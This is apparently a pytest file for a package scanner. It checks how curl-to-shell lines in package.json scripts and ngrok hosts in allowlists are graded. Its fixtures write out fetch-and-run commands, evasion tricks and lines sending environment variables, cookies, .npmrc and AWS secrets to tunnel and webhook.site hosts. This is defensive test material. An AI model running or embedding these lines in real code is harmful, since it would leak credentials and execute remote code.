"""Precision: maintainer-only package.json scripts, and tunnel hosts in host allowlists.

A ``curl … | sh`` in a package.json script is low when no install lifecycle script can
reach it (``@modelcontextprotocol/ext-apps``' ``test:e2e:docker``), and keeps its
severity whenever a consumer path might run it. A webhook / tunnel host that is an
element of a host or origin ALLOWLIST (``allowedHosts: ["x.ngrok.io"]`` in ruflo's
vite.config.ts) is not an outbound destination.
"""

from __future__ import annotations

import json

import pytest

from src.scanner.npm_scripts import (
    MAINTAINER_WHY,
    parse_scripts,
    reachable_scripts,
    restore_externally_invoked,
)
from src.scanner.scan import _scan_content

CURL = "curl -fsSL https://get.example.com/i.sh | sh"
PIPE = "curl/wget piped to shell"
EXFIL = "Outbound webhook/exfil URL"


def _pkg(scripts: dict, **extra) -> str:
    return json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts, **extra},
                      indent=2)


def _pipe_sevs(text: str, others: dict | None = None, *, registry: bool = True,
               path: str = "package.json") -> list[str]:
    findings, _p, _s = _scan_content(text, path, None, payloads_full_severity=True)
    restore_externally_invoked(findings, {path: text, **(others or {})},
                               registry_artifact=registry)
    return sorted(f.severity for f in findings if f.name == PIPE)


# --- precision -------------------------------------------------------------------

def test_maintainer_script_is_low():
    text = _pkg({"test:e2e:docker": f"docker run img sh -c '{CURL}'", "build": "tsc"})
    findings, _p, _s = _scan_content(text, "package.json")
    pipe = [f for f in findings if f.name == PIPE]
    assert [f.severity for f in pipe] == ["low"]
    assert pipe[0].remediation == MAINTAINER_WHY
    assert not pipe[0].payload


def test_ext_apps_shape_is_low():
    """The real ext-apps scripts: prepare/prepack reach build and its helpers, never
    the docker recipes."""
    docker = (f"docker run --rm -v $(pwd):/work img sh -c 'apt-get install curl && "
              f"{CURL} && npm ci && npx playwright test'")
    text = _pkg({
        "build": "npm run generate:schemas && npm run sync:snippets && node scripts/b.mjs",
        "generate:schemas": "tsx scripts/gen.ts && prettier --write \"src/generated/**/*\"",
        "sync:snippets": "bun scripts/sync.ts",
        "prepack": "npm run build",
        "prepare": "npm run build && husky",
        "build:all": "npm run examples:build",
        "examples:build": "bun examples/run-all.ts build",
        "test:e2e:docker": docker,
        "test:e2e:docker:update": "npm run build:all && " + docker,
        "generate:screenshots": "npm run build:all && " + docker,
        "prettier": "prettier --check .",
    })
    assert _pipe_sevs(text) == ["low", "low", "low"]
    # A registry tarball does not ship scripts/ - prepare never runs from it.
    assert _pipe_sevs(text, {"dist/index.js": "export const x = 1;\n"}) == ["low"] * 3


def test_outside_scripts_unchanged():
    text = json.dumps({"name": "p", "config": {"setup": CURL}, "scripts": {}}, indent=2)
    assert _pipe_sevs(text) == ["critical"]


# --- recall: stays critical ----------------------------------------------------------

RECALL = {
    "postinstall direct": {"postinstall": CURL},
    "postinstall via npm run": {"postinstall": "npm run setup", "setup": CURL},
    "prepare chain": {"prepare": "npm run build", "build": "npm run fetch", "fetch": CURL},
    "preinstall via yarn": {"preinstall": "yarn x", "x": CURL},
    "pre hook of reachable": {"postinstall": "npm run b", "b": "echo", "preb": CURL},
    "post hook of reachable": {"postinstall": "npm run b", "b": "echo", "postb": CURL},
    "hook of the root itself": {"install": "echo", "preinstall": "echo", "postinstall": CURL},
    "node -e inline": {
        "install": "node -e \"require('child_process').execSync('npm run '+'x')\"",
        "x": CURL},
    "&& chain": {"postinstall": "echo hi && npm run x", "x": CURL},
    "; chain": {"postinstall": "echo hi; npm run x", "x": CURL},
    "|| chain": {"postinstall": "false || npm run x", "x": CURL},
    "run-script alias": {"postinstall": "npm run-script x", "x": CURL},
    "yarn run": {"postinstall": "yarn run x", "x": CURL},
    "pnpm": {"postinstall": "pnpm x", "x": CURL},
    "pnpm run": {"postinstall": "pnpm run x", "x": CURL},
    "bun run": {"postinstall": "bun run x", "x": CURL},
    "node --run": {"postinstall": "node --run x", "x": CURL},
    "npm --prefix": {"postinstall": "npm --prefix . run x", "x": CURL},
    "npm -s run": {"postinstall": "npm -s run x --if-present", "x": CURL},
    "cross-env": {"postinstall": "cross-env A=1 npm run x", "x": CURL},
    "colon names": {"postinstall": "npm run a:b:c", "a:b:c": CURL},
    "npm-run-all": {"postinstall": "npm-run-all --serial a x:b", "a": "echo", "x:b": CURL},
    "run-s glob": {"postinstall": "run-s 'x:*'", "x:a": CURL},
    "run-p glob": {"postinstall": "run-p \"build:**\"", "build:a:b": CURL},
    "concurrently npm:": {"postinstall": "concurrently \"npm:x-*\"", "x-y": CURL},
    "$npm_execpath": {"postinstall": "$npm_execpath run x", "x": CURL},
    "variable name": {"postinstall": "npm run $S", "x": CURL},
    "command substitution": {"postinstall": "npm run $(echo x)", "x": CURL},
    "eval": {"postinstall": "eval npm run x", "x": CURL},
    "npm pack": {"postinstall": "npm pack", "postpack": CURL},
    "npm restart": {"postinstall": "npm restart", "prestart": CURL},
    "npm_package env": {"postinstall": "sh -c \"$npm_package_scripts_x\"", "x": CURL},
    "dependencies hook (git install)": {"dependencies": "npm run x", "x": CURL},
    # adversarial review, round 1
    "npm t": {"postinstall": "npm t", "test": CURL},
    "npm tst": {"postinstall": "npm tst", "test": CURL},
    "npm it": {"postinstall": "npm it", "test": CURL},
    "npm cit": {"postinstall": "npm cit", "test": CURL},
    "npm install-test": {"postinstall": "npm install-test", "test": CURL},
    "prepare npm t": {"prepare": "npm t", "test": CURL},
    "double-quoted part": {"postinstall": "npm run fe\"tch\"", "fetch": CURL},
    "empty quotes": {"postinstall": "npm run fe''tch", "fetch": CURL},
    "backslash": {"postinstall": "npm run fe\\tch", "fetch": CURL},
    "brace expansion": {"postinstall": "npm run fe{tch,}", "fetch": CURL},
    "name with space": {"postinstall": "npm run 'my fetch'", "my fetch": CURL},
    "name with =": {"postinstall": "npm run a=b", "a=b": CURL},
    "name with ,": {"postinstall": "npm run a,b", "a,b": CURL},
    "name with NBSP": {"postinstall": "npm run a b", "a b": CURL},
    "run-script-os": {"postinstall": "run-script-os", "postinstall:linux": CURL},
    "npm start default": {"postinstall": "npm start", "prestart": CURL},
    "npm-run-all braces": {"postinstall": "npm-run-all 'f:{a,b}'", "f:a": CURL},
    "unbalanced quote": {"postinstall": "npm run 'x", "x": CURL},
    # adversarial review, round 2: anything the closure cannot follow
    "printf | xargs": {"postinstall": "printf fetc%s h | xargs npm run", "fetch": CURL},
    "base64 | xargs": {"postinstall": "echo ZmV0Y2g= | base64 -d | xargs npm run",
                       "fetch": CURL},
    "tr | xargs": {"postinstall": "echo gfudi | tr b-z a-y | xargs npm run", "fetch": CURL},
    "sequence braces": {"postinstall": "npm run fetc{h..h}", "fetch": CURL},
    "awk system": {"postinstall": "awk 'BEGIN{system(\"npm run fe\" \"tch\")}'",
                   "fetch": CURL},
    "cat | sh": {"postinstall": "cat install.txt | sh", "fetch": CURL},
    "make -f": {"postinstall": "make -f build.txt", "fetch": CURL},
    "dependency bin": {"postinstall": "some-helper", "fetch": CURL},
    "npx bin": {"postinstall": "npx -y some-helper@1", "fetch": CURL},
    "sh -c": {"postinstall": "sh -c 'npm run \"fe\"tch'", "fetch": CURL},
    "npm exec": {"postinstall": "npm exec -- npm run fetch", "fetch": CURL},
    "yarn dlx": {"postinstall": "yarn dlx some-helper", "fetch": CURL},
    "stdin redirect": {"postinstall": "sh < install.txt", "fetch": CURL},
}


@pytest.mark.parametrize("scripts", RECALL.values(), ids=list(RECALL))
def test_reachable_stays_critical(scripts):
    assert "critical" in _pipe_sevs(_pkg(scripts), registry=False)


@pytest.mark.parametrize("raw", [
    # minified: maintainer and consumer scripts on one line
    '{"scripts":{"x":"' + CURL + '","postinstall":"' + CURL + '"}}',
    # duplicate key: JSON.parse keeps the last, which one runs is ambiguous here
    '{"scripts":{"postinstall":"' + CURL + '","postinstall":"echo"}}',
    '{"scripts":{"x":"' + CURL + '"},"scripts":{"postinstall":"npm run x"}}',
    # invalid JSON
    '{"scripts":{"x":"' + CURL + '",}}',
    # non-string script value
    '{"scripts":{"x":"' + CURL + '","y":["a"]}}',
    # a match spanning two scripts
    '{"scripts":{"x":"curl https://e.example/a","postinstall":"y | sh"}}',
], ids=["one-line", "dup-script", "dup-scripts-object", "invalid", "non-string", "span"])
def test_unparseable_or_ambiguous_stays_critical(raw):
    assert "critical" in _pipe_sevs(raw)


def test_external_file_calling_script_restores():
    text = _pkg({"postinstall": "node install.js", "fetch": CURL})
    assert _pipe_sevs(text, {"install.js": "require('child_process').execSync('npm run fetch')"}
                      ) == ["critical"]


def test_external_file_dynamic_name_restores():
    text = _pkg({"postinstall": "node install.js", "fetch": CURL})
    js = "const n = 'fe' + 'tch';\nexecSync(`npm run ${n}`);\n"
    assert _pipe_sevs(text, {"install.js": js}) == ["critical"]


def test_external_file_glob_restores():
    text = _pkg({"postinstall": "node install.js", "fetch:a": CURL})
    js = "spawnSync('run-s', ['fetch:*']);\n"
    assert _pipe_sevs(text, {"install.js": js}) == ["critical"]


def test_reachable_local_file_not_in_tree_restores():
    text = _pkg({"postinstall": "node scripts/setup.js", "fetch": CURL})
    assert _pipe_sevs(text) == ["critical"]


@pytest.mark.parametrize("scripts,others", [
    # wireit: the command lives in package.json outside "scripts"
    ({"postinstall": "wireit", "fetch": CURL}, {}),
    # nx project.json / Taskfile.yml name the script
    ({"postinstall": "nx run p:setup", "fetch": CURL},
     {"project.json": '{"targets":{"setup":{"command":"npm run fetch"}}}'}),
    ({"postinstall": "task setup", "fetch": CURL},
     {"Taskfile.yml": "tasks:\n  setup:\n    cmds:\n      - npm run fetch\n"}),
    # a file with a doc extension that an install script executes
    ({"postinstall": "sh install.txt", "fetch": CURL}, {"install.txt": "npm run fetch\n"}),
    # interpreter arguments without an extension / `node .` when the file is missing
    ({"postinstall": "node scripts/setup", "fetch": CURL}, {}),
    ({"postinstall": "node .", "fetch": CURL}, {}),
], ids=["wireit", "nx", "taskfile", "sh-txt", "node-no-ext", "node-dot"])
def test_orchestrators_and_unseen_files_restore(scripts, others):
    extra = {"wireit": {"postinstall": {"command": "npm run fetch"}}} if \
        scripts.get("postinstall") == "wireit" else {}
    assert _pipe_sevs(_pkg(scripts, **extra), others) == ["critical"]


@pytest.mark.parametrize("files", [
    # a transitively required file whose name looks like a doc (history.js)
    {"setup.js": "require('./history.js')\n",
     "history.js": "require('child_process').execSync('npm run fetch')\n"},
    # a required file under .github/
    {"setup.js": "require('./.github/x.js')\n",
     ".github/x.js": "require('child_process').execSync('npm run fetch')\n"},
    # names built at runtime
    {"setup.js": "require('child_process').execSync('npm run fe' + 'tch')\n"},
    {"setup.js": "const args = ['run', 'fe' + 'tch'];\n"
                 "require('child_process').spawnSync('npm', args)\n"},
    {"setup.js": "spawnSync('npm', ['run'].concat(['fe','tch'].join('')))\n"},
    # child_process reached by a computed require
    {"setup.js": "const cp = require('child' + '_process'); cp.execSync(x)\n"},
], ids=["history-js", "dot-github", "concat", "args-array", "concat-join", "computed-require"])
def test_install_file_that_spawns_restores(files):
    text = _pkg({"postinstall": "node setup.js", "fetch": CURL})
    assert _pipe_sevs(text, files) == ["critical"]


def test_tool_loading_a_js_config_counts_as_package_code():
    """`vite build` / `jest` / `eslint` load the package's own JS config."""
    text = _pkg({"postinstall": "vite build", "fetch": CURL})
    spawn = {"vite.config.js": "import { execSync } from 'node:child_process';\n"
                               "execSync(['npm', 'run', 'fe' + 'tch'].join(' '));\n"}
    assert _pipe_sevs(text, spawn) == ["critical"]
    assert _pipe_sevs(text, {"vite.config.js": "export default {};\n"}) == ["low"]
    # tsc reads only tsconfig.json: inert (a spawn elsewhere that names no package
    # manager does not matter when no install script runs package code).
    other = {"lib/run.js": "require('child_process').execSync(cmd)\n"}
    assert _pipe_sevs(_pkg({"postinstall": "tsc", "fetch": CURL}), other) == ["low"]
    assert _pipe_sevs(_pkg({"postinstall": "vite build", "fetch": CURL}), other) == [
        "critical"]


def test_install_file_without_spawn_keeps_low():
    text = _pkg({"postinstall": "node setup.js", "fetch": CURL})
    assert _pipe_sevs(text, {"setup.js": "console.log('thanks for installing')\n"}) == ["low"]


def test_runtime_code_naming_script_restores():
    text = _pkg({"fetch": CURL})
    assert _pipe_sevs(text, {"dist/cli.js": "spawn('npm', ['run', 'fetch'], {cwd})"}
                      ) == ["critical"]


def test_scripts_table_read_in_code_restores():
    text = _pkg({"fetch": CURL})
    js = "const s = require('./package.json').scripts[name];\nexecSync(s);\n"
    assert _pipe_sevs(text, {"lib/x.js": js}) == ["critical"]


def test_docs_and_type_declarations_do_not_restore():
    text = _pkg({"test:docker": CURL})
    others = {"README.md": "Run `npm run test:docker`.",
              "dist/a.d.ts": "/**\n * @see npm run test:docker\n * \n */\n",
              ".github/workflows/ci.yml": "run: npm run test:docker"}
    assert _pipe_sevs(text, others) == ["low"]


def test_git_dependency_roots_in_repo_mode():
    """A repo tree (git install): prepare's local helper missing from view restores."""
    text = _pkg({"prepare": "node scripts/build.js", "x": CURL})
    assert _pipe_sevs(text, registry=False) == ["critical"]
    assert _pipe_sevs(text, {"scripts/build.js": "console.log(1)"}, registry=False) == ["low"]
    # ...and a registry tarball never runs prepare.
    assert _pipe_sevs(text, registry=True) == ["low"]


def test_parse_and_closure_units():
    info = parse_scripts(_pkg({"prepare": "npm run b", "b": "run-p 'c:*'",
                               "c:1": "tsc -p .", "prec:1": "echo hi", "d": "z"}))
    assert info is not None
    assert reachable_scripts(info.scripts) == {"prepare", "b", "c:1", "prec:1"}
    # A command the closure cannot follow (a dependency's bin) reaches everything.
    assert reachable_scripts({"postinstall": "some-bin", "d": "x"}) == {"postinstall", "d"}
    assert parse_scripts("not json") is None
    assert parse_scripts('{"scripts": "x"}') is None


# --- reason wording -----------------------------------------------------------------

def test_reachable_package_json_reads_install_script():
    from src.scanner.verdict import finding_where
    assert finding_where({"category": "dynamic_remote_load",
                          "file_path": "package.json"}) == " in its install script"


# --- tunnel host in a host allowlist ------------------------------------------------

def _exfil(src: str, path: str, others: dict | None = None) -> list[tuple[str, int]]:
    findings, _p, _s = _scan_content(src, path)
    restore_externally_invoked(findings, {path: src, **(others or {})})
    return [(f.severity, f.line_number) for f in findings
            if f.name == EXFIL and f.severity != "low"]


@pytest.mark.parametrize("path,src", [
    ("vite.config.ts", 'export default {\n  server: {\n    port: 5173,\n'
                       '    // See Vite server.allowedHosts: string[] | true\n'
                       '    allowedHosts: ["huggingface.ngrok.io"],\n  },\n};\n'),
    ("vite.config.ts", 'export default {\n  server: {\n    allowedHosts: [\n'
                       '      "a.example.com",\n      "x.ngrok.io",\n    ],\n  },\n};\n'),
    ("settings.py", 'ALLOWED_HOSTS = ["localhost", "x.ngrok.io"]\n'
                    'CSRF_TRUSTED_ORIGINS = ["https://x.ngrok-free.app"]\n'),
    ("app.js", "app.use(cors({ origin: ['https://x.ngrok.io'] }));\n"),
    ("vite.config.js", "export default {\n  server: { hmr: { host: 'x.ngrok.io' } }\n}\n"),
    ("main.py", 'app.add_middleware(TrustedHostMiddleware, allowed_hosts=["x.ngrok.io"])\n'),
], ids=["vite", "vite-multiline", "django", "cors", "hmr", "starlette"])
def test_allowlist_entry_not_exfil(path, src):
    assert _exfil(src, path) == []


@pytest.mark.parametrize("src", [
    "fetch('https://x.ngrok.io', {method: 'POST', body: JSON.stringify(process.env)});\n",
    "const allowedHosts = ['x.ngrok.io'];\nfetch(allowedHosts[0], {method: 'POST', body});\n",
    "const allowedHosts = ['x.ngrok.io'];\nconst u = allowedHosts[0];\nfetch(u);\n",
    "const cfg = { allowedHosts: ['x.ngrok.io'] };\naxios.post('https://x.ngrok.io/h', d);\n",
    "const cfg = { allowedHosts: ['x.ngrok.io'] };\nhttp.request(cfg.allowedHosts[0]);\n",
    "const cfg = { url: 'https://x.ngrok.io' };\n",
    "const endpoint = 'https://x.ngrok.io/collect';\n",
    "const webhook = 'https://webhook.site/abc';\n",
    "const target = 'https://x.ngrok.io';\n",
    "axios.create({ baseURL: 'https://x.ngrok.io' });\n",
    "http.request({ host: 'x.ngrok.io', path: '/' });\n",
    "const allowedHosts = ['x.ngrok.io']; fetch('https://webhook.site/x');\n",
    "const allowedHosts = ['a']; send('x.ngrok.io');\n",
    "const allowedHosts = ['https://x.ngrok.io/' + process.env.TOKEN];\n",
    # adversarial review, round 1
    'fetch((allowedHosts = ["https://abc.ngrok.io"])[0], {method:"POST", body:data});\n',
    'axios.post("/x", data, { origin: "https://abc.ngrok.io" });\n',
    'const client = createClient({ origin: "https://abc.ngrok.io" });\nclient.send(data);\n',
    'let allowedHosts = ["https://abc.ngrok.io"];\n'
    'allowedHosts = allowedHosts.filter(h => fetch(h, {method:"POST", body}));\n',
    'const allowedHosts = ["https://abc.ngrok.io"];\n'
    'fetch(allowedHosts[0], {}); const origins = [\n"a"];\n',
    'fetch((allowedHosts = [\n  "https://abc.ngrok.io",\n])[0], {method:"POST", body});\n',
    'const allowedHosts = ["https://abc.ngrok.io"];\n/**/ fetch(allowedHosts[0], {});\n',
    'const cfg = { allowedHosts: ["https://abc.ngrok.io"] };\nclass A {\n'
    '  #go() { return fetch(this.allowedHosts[0], {}) }\n}\n',
    'const cfg = { allowedHosts: ["https://abc.ngrok.io"] };\n'
    'for (const v of Object.values(cfg)) fetch(v[0], {method:"POST", body});\n',
    'const cfg = { allowedHosts: ["https://abc.ngrok.io"] };\n'
    'fetch(cfg["allowed" + "Hosts"][0], {});\n',
], ids=["fetch-env", "allowlist-fetched", "allowlist-aliased", "host-also-requested",
        "allowlist-prop-requested", "url", "endpoint", "webhook", "target", "baseURL",
        "host-no-hmr", "second-host-same-line", "not-an-element", "concat",
        "same-line-sink", "origin-option", "origin-client", "reassign-filter",
        "open-line-hides-use", "multiline-in-call", "block-comment-prefix",
        "private-method", "object-values", "computed-key"])
def test_destination_stays_critical(src):
    assert any(sev == "critical" for sev, _ln in _exfil(src, "a.js"))


CFG = 'const cfg = { allowedHosts: ["https://abc.ngrok.io"] };\n'


@pytest.mark.parametrize("src", [
    # round 2: sinks that are not a plain call
    CFG + 'for (const v of Object.values(cfg)) new Image().src = v[0] + "?d=" + '
          'document.cookie;\n',
    CFG + 'location.href = Object.values(cfg)[0][0] + "?t=" + localStorage.token;\n',
    CFG + 'import(Object.values(cfg)[0][0] + "/x.mjs");\n',
    CFG + '$.ajax({url: Object.values(cfg)[0][0], data: document.cookie});\n',
    CFG + 'require("child_process").execSync("curl -d @" + process.env.HOME + '
          '"/.npmrc " + Object.values(cfg)[0][0]);\n',
    # round 2: comment look-alikes hiding code
    "const x = 1\n" + CFG + '  * fetch(Object.values(cfg)[0][0], {method:"POST", '
    'body: JSON.stringify(process.env)});\n',
    CFG + 'const s = "/*", r = fetch(Object.values(cfg)[0][0], {}), e = "*/";\n',
    CFG + 'const g = ["src/**", fetch(Object.values(cfg)[0][0], {}), "**/x"];\n',
    # round 2: a cors gate satisfied by a comment
    '// cors\nconst client = mk({ origin: "https://abc.ngrok.io" });\n'
    'client.upload(JSON.stringify(process.env));\n',
    # same line, a wrapper the regexes do not know
    'const allowedHosts = ["https://abc.ngrok.io"]; post(allowedHosts[0], env);\n',
], ids=["image-src", "location-href", "dynamic-import", "jquery-ajax", "exec-curl",
        "star-continuation", "comment-in-string", "glob-strings", "cors-comment",
        "same-line-wrapper"])
def test_destination_round2_stays_critical(src):
    assert any(sev == "critical" for sev, _ln in _exfil(src, "a.js"))


@pytest.mark.parametrize("src", [
    'ALLOWED_HOSTS = ["abc.ngrok.io"]\n'
    'subprocess.run(["curl","-d",os.environ["AWS_SECRET_ACCESS_KEY"],'
    '"https://"+globals()["ALLOWED_"+"HOSTS"][0]])\n',
    'ALLOWED_HOSTS = ["abc.ngrok.io"]\n'
    'x = "/*"; requests.post("https://"+globals()["ALLOWED_"+"HOSTS"][0], '
    'data=os.environ); y = "*/"\n',
], ids=["py-subprocess-globals", "py-comment-in-string"])
def test_python_destination_round2_stays_critical(src):
    assert any(sev == "critical" for sev, _ln in _exfil(src, "settings.py"))


@pytest.mark.parametrize("path,src,others", [
    ("config.js", 'export const allowedHosts = ["https://abc.ngrok.io"];\n',
     {"send.js": "import { allowedHosts } from './config.js';\n"
                 "fetch(allowedHosts[0], {method: 'POST', body});\n"}),
    ("myapp/settings.py", 'ALLOWED_HOSTS = ["abc.ngrok.io"]\n',
     {"myapp/views.py": "from django.conf import settings\n"
                        "requests.post('https://' + settings.ALLOWED_HOSTS[0], data=d)\n"}),
    ("vite.config.ts", 'export default { server: { allowedHosts: ["x.ngrok.io"] } };\n',
     {"src/send.ts": "import cfg from '../vite.config';\n"
                     "fetch(Object.values(cfg.server)[0][0]);\n"}),
], ids=["js-export", "django-views", "config-import"])
def test_allowlist_read_by_another_file_stays_critical(path, src, others):
    assert any(sev == "critical" for sev, _ln in _exfil(src, path, others))
    # ...and alone the same file is relaxed.
    assert _exfil(src, path) == []


def test_python_walrus_stays_critical():
    src = ('import os, requests\n'
           'requests.post((ALLOWED_HOSTS := ["https://abc.ngrok.io"])[0], '
           'data=dict(os.environ))\n')
    assert any(sev == "critical" for sev, _ln in _exfil(src, "a.py"))
